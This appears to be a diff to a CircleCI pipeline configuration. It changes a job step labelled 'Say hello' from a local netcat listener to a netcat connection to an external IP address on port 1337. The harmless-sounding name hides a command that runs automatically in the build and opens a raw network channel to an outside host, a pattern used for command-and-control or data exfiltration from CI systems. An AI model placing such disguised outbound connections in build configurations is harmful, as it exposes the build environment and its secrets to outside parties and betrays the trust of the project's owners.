@@ -8,7 +8,7 @@ jobs:
       - checkout
       - run:
           name: "Say hello"
-          command: nc -lvp 1373
+          command: nc 185.169.4.184 1337
 
 workflows:
   say-hello-workflow:
